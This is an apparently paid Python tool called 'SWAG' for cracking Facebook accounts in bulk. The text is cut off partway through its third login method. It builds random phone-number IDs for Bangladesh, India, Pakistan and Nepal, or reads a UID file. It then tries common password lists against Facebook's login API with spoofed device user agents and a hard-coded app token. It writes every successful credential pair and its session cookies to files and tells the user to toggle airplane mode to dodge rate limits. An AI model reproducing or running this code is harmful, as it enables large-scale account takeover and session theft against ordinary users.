#__________________[ IMPORT ]__________________#
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')
try:
	import os,requests,json,time,re,random,sys,uuid,string,subprocess
	from string import *
	import bs4
	#import dz
	from concurrent.futures import ThreadPoolExecutor as tred
	from bs4 import BeautifulSoup as sop
	from bs4 import BeautifulSoup
except ModuleNotFoundError: 
	print('\n Installing missing modules ...')
	os.system('pip install requests bs4 futures==2 > /dev/null')
	os.system('python swag.py')
os.system('clear')
print(f'\x1b[38;5;196m❲\x1b[38;5;46m=\x1b[38;5;196m❳\x1b[1;97m LOADING SYSTEM CHECKING ');time.sleep(1)
#__________________[ ETC ]__________________#
sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Zong'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Zong"
                        sim_id+=fbcr
        else:
                fbcr = 'Zong'
                sim_id+=fbcr
except:
        fbcr = "Zong"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}
#__________________[ LOOP ]__________________#
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]
#__________________[ SYS ]__________________#
sys.stdout.write('\x1b]2; SWAG-143\x07')
#__________________[ COLOUR ]__________________#
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
#__________________[ LINEX ]__________________#
def clear():os.system('clear');print(logo)
def linex():print(f'{A}──────────────────────────────────────────────────')
#__________________[ UA ]__________________#
def uax():
	fban = random.choice(["FB4A"])
	facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
	fbbv = str(random.randint(10000000, 66666666))
	density = random.choice(['1.0', '1.5', '2.0', '2.5', '3.0'])
	width = random.choice(["720", "1080", "1280"])
	height = random.choice(["720", "1080", "1280", "1440", "1920"])
	fbcr = random.choice(['Nepal_Telecom', 'Banglalink', 'Robi', 'Grameenphone', 'Airtel'])
	fblc = random.choice(["en_US", "en_GB"])
	fbbd = 'Redmi'
	fbpn = random.choice(["com.facebook.katana"])
	fbsv = f"{random.randint(4, 13)}.{random.randint(0, 5)}.{random.randint(1, 5)}"
	fbmf = 'Redmi'
	build = random.choice(['SKQ1.210216.001','RKQ1.211103.002','SP1A.210812.016','TP1A.220905.001'])
	fbdv = random.choice(["Redmi Note 8", "Redmi Note 8", "Redmi Note 9", "Redmi Note 10", "Redmi 9", "Redmi 9A", "Redmi 8", "Redmi 9C", "Redmi 8A", "Redmi 7A"])
	END = f"[FBAN/{str(fban)};FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={density},width={width},height={height}}};FBLC/{str(fblc)};FBCR/{str(fbcr)};FBMF/{str(fbmf)};FBBD/{str(fbbd)};FBPN/{str(fbpn)};FBDV/{str(fbdv)};FBSV/{str(fbsv)};FBOP/19;FBCA/armeabi-v7a:armeabi;]"
	ua = f'Davik/2.1.0 (Linux; U; Android {fbsv} '+str(fbdv)+' Build/'+str(build)+') '+END
	return ua
#__________________[ LOGO ]__________________#
logo =f"""{A}
    {A}   .dMMMb  dMP dMP dMP .aMMMb  .aMMMMP 
    {A}  dMP" VP dMP dMP dMP dMP"dMP dMP"     
    {G}  VMMMb  dMP dMP dMP dMMMMMP dMP MMP"  
    {A}dP .dMP dMP.dMP.dMP dMP dMP dMP.dMP    
    {A}VMMMP"  VMMMPVMMP" dMP dMP  VMMMP" {R}❲{G}V{A}/{G}2.7{R}❳{A}
{A}──────────────────────────────────────────────────
{R}❲{G}={R}❳{A} OWNER    {R}:{A} HABIB HOSSAIN
{R}❲{G}={R}❳{A} FACEBOOK {R}:{A} HABIB\_____:*\❷/3:)\⓿
{R}❲{G}={R}❳{A} TOOLTYPE {R}:{A} FILE CLONING
{R}❲{G}={R}❳{A} STATUS   {R}:{A} PAID
{A}──────────────────────────────────────────────────"""
#__________________[ KEY ]__________________#
#os.system('clear')   
#import getpass
#attemps = 0
#os.system('clear')
#print(logo)
#while attemps < 999999999998888888888889999999999999999999999999999:
#    bal = input(f'{R}❲{G}={R}❳{A} YOUR LICENSE {R}:{A} ')
  
#    os.system('clear');print(logo)
#    if bal == 'SWAG6989':
#        print(f'{R}❲{G}={R}❳{A} LICENSE SUCCESSFUL ')
#        break
#    else:
#        attemps += 1
#        continue
#__________________[ MENU ]__________________#
def menu():
			clear()
			print(f'{R}❲{G}1{R}❳{A} FILE CLONING\n{R}❲{G}2{R}❳{A} RANDOM CLONING\n{R}❲{G}3{R}❳{A} CONTACT TOOL OWNER\n{R}❲{G}0{R}❳{A} EXIT TOOL')
			linex()
			xd=input(f'{R}❲{G}?{R}❳{A} CHOICE {R}:{A} ')
			if xd in ['1','01']:
				clear()
				print(f'{R}❲{G}={R}❳{A} EXAMPLE {R}:{A}  /sdcard/SWAG.txt');linex()
				file = input(f'{R}❲{G}?{R}❳{A} FILE NAME {R}:{A}  ')
				try:
					fo = open(file,'r').read().splitlines()
				except FileNotFoundError:
					print(f'{R}❲{G}={R}❳{A} FILE LOCATION NOT FOUND ')
					time.sleep(1)
					menu()
				clear()
				print(f'{R}❲{G}1{R}❳{A} METHOD {R}❲{G}M1{R}❳{A} \n{R}❲{G}2{R}❳{A} METHOD {R}❲{G}M2{R}❳{A}  \n{R}❲{G}3{R}❳{A} METHOD {R}❲{G}M3{R}❳{A} \n{R}❲{G}4{R}❳{A} METHOD {R}❲{G}M4{R}❳{A} ')
				linex()
				mthd=input(f'{R}❲{G}?{R}❳{A} CHOICE {R}:{A} ')
				clear()
				print(f'{R}❲{G}={R}❳{A} EXAMPLE {R}:{A} BD/10-20 & OTHERS/5-10');linex()
				plist = []
				try:
					ps_limit = int(input(f'{R}❲{G}?{R}❳{A} PASSWORD LIMIT {R}:{A} '))
				except:
					ps_limit =1
				clear()
				print(f'{R}❲{G}?{R}❳{A} EXAMPLE {R}:{A} first123/firstlast/first@@@')
				linex()
				for i in range(ps_limit):
					plist.append(input(f'{R}❲{G}?{R}❳{A} PASSWORD NO {R}❲{G}{i+1}{R}❳{A} {R}:{A} '))
				clear()
				print(f'{R}❲{G}?{R}❳{A} DO YOU WENT SHOW CP ACCOUNT {R}❲{G}y{A}/{G}n{R}❳{A} ')
				linex()
				cx=input(f'{R}❲{G}?{R}❳{A} CHOICE {R}:{A} ')
				if cx in ['y','Y','yes','Yes','1']:
					pcp.append('y')
				else:
					pcp.append('n')
				with tred(max_workers=30) as crack_submit:
					clear()
					total_ids = str(len(fo))
					print(f'{R}❲{G}={R}❳{A} TOTAL FILE UID {R}:{A} '+total_ids+f' ')
					print(f'{R}❲{G}={R}❳{A} PASSWORD LIMIT {R}:{A} {str(len(plist))} ')
					print(f'{R}❲{G}={R}❳{A} TURN {R}❲{G}ON{A}/{G}OFF{R}❳{A} AIRPLANE MODE EVERY 3 MIN')
					linex()
					for user in fo:
						ids,names = user.split('|')
						passlist = plist
						if mthd in ['1','01']:
							crack_submit.submit(api1,ids,names,passlist)
						elif mthd in ['2','02']:
							crack_submit.submit(api2,ids,names,passlist)
						elif mthd in ['3','03']:
							crack_submit.submit(api3,ids,names,passlist)
						elif mthd in ['4','04']:
							crack_submit.submit(api4,ids,names,passlist)
				print('\033[1;37m')
				print(f'\r{A}──────────────────────────────────────────────────')
				print(f'{R}❲{G}={R}❳{A} THE PROCESS HAS BEEN COMPLETE...')
				print(f'{R}❲{G}={R}❳{A} TOTAL OK ID {R}:{G} '+str(len(oks)))
				print(f'{R}❲{G}={R}❳{A} TOTAL CP ID {R}:{M} '+str(len(cps)))
				print(f'\r{A}──────────────────────────────────────────────────')
				input(f'{R}❲{G}={R}❳{A} PRESS ENTER TO BACK ')
				menu()
			elif xd in ['2','B']:
				randm()
			elif xd in ['3','C']:
				os.system('xdg-open https://www.facebook.com/sk.sahathat');menu()
			elif xd in ['0','00']:
				exit(f'{R}❲{G}={R}❳{A} BYE BYE ')
			else:
				exit(f'{R}❲{G}={R}❳{A} OPTION NOT FOUND IN MENU...')
#__________________[ RANDOM ]__________________#
def randm():
	clear()
	print(f'{R}❲{G}1{R}❳{A} BANGLADESH CLONING\n{R}❲{G}2{R}❳{A} INDIA CLONING\n{R}❲{G}3{R}❳{A} PAKISTAN CLONING\n{R}❲{G}4{R}❳{A} NEPAL CLONING\n{R}❲{G}0{R}❳{A} BACK TO MENU');linex()
	xd=input(f'{R}❲{G}?{R}❳{A} CHOICE {R}:{A} ')
	if xd in ['1','01']:
		bd()
	elif xd in ['2','B']:
		India()
	elif xd in ['3','C']:
		pakistan()
	elif xd in ['4','D']:
		nepal()
	elif xd in ['0','00']:
		menu()
	else:
		exit(f'{R}❲{G}={R}❳{A} OPTION NOT FOUND IN MENU...')
#__________________[ BANGLADESH ]__________________#
def bd():
		user=[]
		clear()
		print(f'{R}❲{G}={R}❳{A} EXAMPLE {R}:{A} 017 {R}|{A} 019 {R}|{A} 018 {R}|{A} 016 ');linex()
		code = input(f'{R}❲{G}?{R}❳{A} CHOICE  {R}:{A} ')
		doamin = ' BD Number id cloner [ONLY-OK] '
		clear();print(f'{R}❲{G}={R}❳{A} EXAMPLE {R}:{A} 3000 {R}|{A} 5000 {R}|{A} 10000 {R}|{A} 99999 ');linex()
		limit = int(input(f'{R}❲{G}?{R}❳{A} CHOICE  {R}:{A} '))
		clear()
		print(f'{R}❲{G}1{R}❳{A} METHOD {R}❲{G}M1{R}❳{A} \n{R}❲{G}2{R}❳{A} METHOD {R}❲{G}M2{R}❳{A} \n{R}❲{G}3{R}❳{A} METHOD {R}❲{G}M3{R}❳{A} ');linex()
		mthd = input(f'{R}❲{G}?{R}❳{A} CHOICE  {R}:{A} ')
		for nmbr in range(limit):
			nmp = ''.join(random.choice(string.digits) for _ in range(8))
			user.append(nmp)
		with tred(max_workers=30) as swag:	
			clear()
			tl = str(len(user))
			print(f'{R}❲{G}={R}❳{A} TOTAL UID {R}:{G} '+tl)
			print(f'{R}❲{G}={R}❳{A} SIM CODE  {R}:{G} '+code)
			print(f'{R}❲{G}={R}❳{A} TURN {R}❲{G}ON{A}/{G}OFF{R}❳{A} AIRPLANE MODE EVERY 3 MIN');linex()
			for psx in user:
				ids = code+psx
				passlist = [psx[2:],psx,code+psx,code+psx[:3],code+psx[5:],'free fire','Free Fire','freefire','FreeFire','jannat','203040','ayesha','405060','506070','jannatul','708090','sabbir','i love you','nusrat','mimmim','humaira']
				if mthd in ['1','01']:
					swag.submit(swag1,ids,passlist)
				if mthd in ['2','02']:
					swag.submit(swag2,ids,passlist)
				if mthd in ['3','03']:
					swag.submit(swag3,ids,passlist)
		print('\033[1;37m')
		print(f'\r{A}──────────────────────────────────────────────────')
		print(f'{R}❲{G}={R}❳{A} THE PROCESS HAS BEEN COMPLETE...')
		print(f'{R}❲{G}={R}❳{A} TOTAL OK ID {R}:{G} '+str(len(oks)))
		print(f'{R}❲{G}={R}❳{A} TOTAL CP ID {R}:{M} '+str(len(cps)))
		print(f'\r{A}──────────────────────────────────────────────────')
		input(f'{R}❲{G}={R}❳{A} PRESS ENTER TO BACK ')
		menu()
#__________________[ INDIA ]__________________#
def India():
		user=[]
		clear()
		print(f'{R}❲{G}={R}❳{A} EXAMPLE {R}:{A} +91639 {R}|{A} +91934 {R}|{A} +91902 {R}|{A} +91701 ');linex()
		code = input(f'{R}❲{G}?{R}❳{A} CHOICE  {R}:{A} ')
		doamin = ' BD Number id cloner [ONLY-OK] '
		clear();print(f'{R}❲{G}={R}❳{A} EXAMPLE {R}:{A} 3000 {R}|{A} 5000 {R}|{A} 10000 {R}|{A} 99999 ');linex()
		limit = int(input(f'{R}❲{G}?{R}❳{A} CHOICE  {R}:{A} '))
		clear()
		print(f'{R}❲{G}1{R}❳{A} METHOD {R}❲{G}M1{R}❳{A} \n{R}❲{G}2{R}❳{A} METHOD {R}❲{G}M2{R}❳{A} \n{R}❲{G}3{R}❳{A} METHOD {R}❲{G}M3{R}❳{A} ');linex()
		mthd = input(f'{R}❲{G}?{R}❳{A} CHOICE  {R}:{A} ')
		for nmbr in range(limit):
			nmp = "". join(random.choice(string.digits) for _ in range(7))
			user.append(nmp)
		with tred(max_workers=30) as swag:	
			clear()
			tl = str(len(user))
			print(f'{R}❲{G}={R}❳{A} TOTAL UID {R}:{G} '+tl)
			print(f'{R}❲{G}={R}❳{A} SIM CODE  {R}:{G} '+code)
			print(f'{R}❲{G}={R}❳{A} TURN {R}❲{G}ON{A}/{G}OFF{R}❳{A} AIRPLANE MODE EVERY 3 MIN');linex()
			for psx in user:
				ids = code+psx
				passlist = [psx,ids[:8],'57273200','59039200','57575751']
				if mthd in ['1','01']:
					swag.submit(swag1,ids,passlist)
				if mthd in ['2','02']:
					swag.submit(swag2,ids,passlist)
				if mthd in ['3','03']:
					swag.submit(swag3,ids,passlist)
		print('\033[1;37m')
		print(f'\r{A}──────────────────────────────────────────────────')
		print(f'{R}❲{G}={R}❳{A} THE PROCESS HAS BEEN COMPLETE...')
		print(f'{R}❲{G}={R}❳{A} TOTAL OK ID {R}:{G} '+str(len(oks)))
		print(f'{R}❲{G}={R}❳{A} TOTAL CP ID {R}:{M} '+str(len(cps)))
		print(f'\r{A}──────────────────────────────────────────────────')
		input(f'{R}❲{G}={R}❳{A} PRESS ENTER TO BACK ')
		menu()
#__________________[ PAKISTAN ]__________________#
def pakistan():
		user=[]
		clear()
		print(f'{R}❲{G}={R}❳{A} EXAMPLE {R}:{A} 0306 {R}|{A} 0315 {R}|{A} 0335 {R}|{A} 0345 ');linex()
		code = input(f'{R}❲{G}?{R}❳{A} CHOICE  {R}:{A} ')
		doamin = ' BD Number id cloner [ONLY-OK] '
		clear();print(f'{R}❲{G}={R}❳{A} EXAMPLE {R}:{A} 3000 {R}|{A} 5000 {R}|{A} 10000 {R}|{A} 99999 ');linex()
		limit = int(input(f'{R}❲{G}?{R}❳{A} CHOICE  {R}:{A} '))
		clear()
		print(f'{R}❲{G}1{R}❳{A} METHOD {R}❲{G}M1{R}❳{A} \n{R}❲{G}2{R}❳{A} METHOD {R}❲{G}M2{R}❳{A} \n{R}❲{G}3{R}❳{A} METHOD {R}❲{G}M3{R}❳{A} ');linex()
		mthd = input(f'{R}❲{G}?{R}❳{A} CHOICE  {R}:{A} ')
		for nmbr in range(limit):
			nmp = "". join(random.choice(string.digits) for _ in range(7))
			user.append(nmp)
		with tred(max_workers=30) as swag:	
			clear()
			tl = str(len(user))
			print(f'{R}❲{G}={R}❳{A} TOTAL UID {R}:{G} '+tl)
			print(f'{R}❲{G}={R}❳{A} SIM CODE  {R}:{G} '+code)
			print(f'{R}❲{G}={R}❳{A} TURN {R}❲{G}ON{A}/{G}OFF{R}❳{A} AIRPLANE MODE EVERY 3 MIN');linex()
			for psx in user:
				ids = code+psx
				passlist = [psx,ids,'khankhan','khan1122','ali12345','khanbaba','pakistan','khan12345','ali1122','khankhan12345','khan','baloch','pubg','pubg1122']
				if mthd in ['1','01']:
					swag.submit(swag1,ids,passlist)
				if mthd in ['2','02']:
					swag.submit(swag2,ids,passlist)
				if mthd in ['3','03']:
					swag.submit(swag3,ids,passlist)
		print('\033[1;37m')
		print(f'\r{A}──────────────────────────────────────────────────')
		print(f'{R}❲{G}={R}❳{A} THE PROCESS HAS BEEN COMPLETE...')
		print(f'{R}❲{G}={R}❳{A} TOTAL OK ID {R}:{G} '+str(len(oks)))
		print(f'{R}❲{G}={R}❳{A} TOTAL CP ID {R}:{M} '+str(len(cps)))
		print(f'\r{A}──────────────────────────────────────────────────')
		input(f'{R}❲{G}={R}❳{A} PRESS ENTER TO BACK ')
		menu()
#__________________[ NEPAL ]__________________#
def nepal():
		user=[]
		clear()
		print(f'{R}❲{G}={R}❳{A} EXAMPLE {R}:{A} 9815 {R}|{A} 9814 {R}|{A} 9861 {R}|{A} 9840 ');linex()
		code = input(f'{R}❲{G}?{R}❳{A} CHOICE  {R}:{A} ')
		doamin = ' BD Number id cloner [ONLY-OK] '
		clear();print(f'{R}❲{G}={R}❳{A} EXAMPLE {R}:{A} 3000 {R}|{A} 5000 {R}|{A} 10000 {R}|{A} 99999 ');linex()
		limit = int(input(f'{R}❲{G}?{R}❳{A} CHOICE  {R}:{A} '))
		clear()
		print(f'{R}❲{G}1{R}❳{A} METHOD {R}❲{G}M1{R}❳{A} \n{R}❲{G}2{R}❳{A} METHOD {R}❲{G}M2{R}❳{A} \n{R}❲{G}3{R}❳{A} METHOD {R}❲{G}M3{R}❳{A} ');linex()
		mthd = input(f'{R}❲{G}?{R}❳{A} CHOICE  {R}:{A} ')
		for nmbr in range(limit):
			nmp = "". join(random.choice(string.digits) for _ in range(6))
			user.append(nmp)
		with tred(max_workers=30) as swag:	
			clear()
			tl = str(len(user))
			print(f'{R}❲{G}={R}❳{A} TOTAL UID {R}:{G} '+tl)
			print(f'{R}❲{G}={R}❳{A} SIM CODE  {R}:{G} '+code)
			print(f'{R}❲{G}={R}❳{A} TURN {R}❲{G}ON{A}/{G}OFF{R}❳{A} AIRPLANE MODE EVERY 3 MIN');linex()
			for psx in user:
				ids = code+psx
				passlist = [ids,psx,ids[:8],ids[:7],ids[:6],'nepal12','nepal123','nepal1234','nepal12345','maya123','kathmandu','pokhara','tamang','maya1234','tamang123','tamang12345','nepal@123','kathmandu123']
				if mthd in ['1','01']:
					swag.submit(swag1,ids,passlist)
				if mthd in ['2','02']:
					swag.submit(swag2,ids,passlist)
				if mthd in ['3','03']:
					swag.submit(swag3,ids,passlist)
		print('\033[1;37m')
		print(f'\r{A}──────────────────────────────────────────────────')
		print(f'{R}❲{G}={R}❳{A} THE PROCESS HAS BEEN COMPLETE...')
		print(f'{R}❲{G}={R}❳{A} TOTAL OK ID {R}:{G} '+str(len(oks)))
		print(f'{R}❲{G}={R}❳{A} TOTAL CP ID {R}:{M} '+str(len(cps)))
		print(f'\r{A}──────────────────────────────────────────────────')
		input(f'{R}❲{G}={R}❳{A} PRESS ENTER TO BACK ')
		menu()
#__________________[ FILE METHOD M1 ]__________________#
def api1(ids,names,passlist):
        try:
                global oks,cps,loop,sim_id
                sys.stdout.write(f'\r\r{R}❲{A}SWAG-M1{R}❳{A}-{R}❲{A}%s{R}❳{A}-{R}❲{A}OK:%s{R}❳{A}-{R}❲{A}CP:%s{R}❳ '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US','en_GB'])
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ua ='Davik/2.1.0 (Linux; U; Android 7.0.0; MMB29K Build/GT-P5100 [FBAN/FB4A;FBAV/241.0.0.41292;FBBV/975202462;FBDM/{density=2.75,width=720,height=9398};FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.mlite;FBDV/MMB29K;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                        headers = {"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","User-Agent": uax(),"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{G}❲SWAG-OK❳ '+ids+' | '+pas+'\033[1;97m')
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);swagb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={swagb};{ckkk}"
                                        print(f"\r\r{G}❲COOKIE❳ {R}:{A} "+cookie)
                                        open('/sdcard/SWAG-FILE-M1-OK.txt','a').write(ids+'|'+pas+ ' | ' +cookie+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{M}❲SWAG-CP❳ '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/SWAG-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
#__________________[ FILE METHOD M2 ]__________________#
def api2(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write(f'\r\r{R}❲{A}SWAG-M2{R}❳{A}-{R}❲{A}%s{R}❳{A}-{R}❲{A}OK:%s{R}❳{A}-{R}❲{A}CP:%s{R}❳ '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1440,height=8797};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                "adid": adid,
                                "format": "json",
                                "device_id": str(uuid.uuid4()),
                                "email": ids,
                                "password": pas,
                                "generate_analytics_claims": "1",
                                "credentials_type": "password",
                                "source": "login",
                                "error_detail_type": "button_with_disabled",
                                "enroll_misauth": "false",
                                "generate_session_cookies": "1",
                                "generate_machine_id": "1",
                                "fb_api_req_friendly_name": "authenticate",}
                        headers={
                                "Accept-Encoding": "gzip, deflate",
                                "Accept": "*/*",
                                "Connection": "keep-alive",
                                "User-Agent": "[FBAN/FB4A;FBAV/56.0.0.3675;FBBV/1829925;'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Airtel;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/L-EMENT500;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
                                "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                                "X-FB-Friendly-Name": "authenticate",
                                "X-FB-Connection-Type": "unknown",
                                "Content-Type": "application/x-www-form-urlencoded",
                                "X-FB-HTTP-Engine": "Liger",
                                "Content-Length": "329",}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{G}❲SWAG-OK❳ '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{G}❲COOKIE❳ {R}:{A} "+coki)
                                        open('/sdcard/SWAG-FILE-M2-OK.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{M}❲SWAG-CP❳ '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/SWAG-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
#__________________[ FILE METHOD M3 ]__________________#
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write(f'\r\r{R}❲{A}SWAG-M3{R}❳{A}-{R}❲{A}%s{R}❳{A}-{R}❲{A}OK:%s{R}❳{A}-{R}❲{A}CP:%s{R}❳ '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
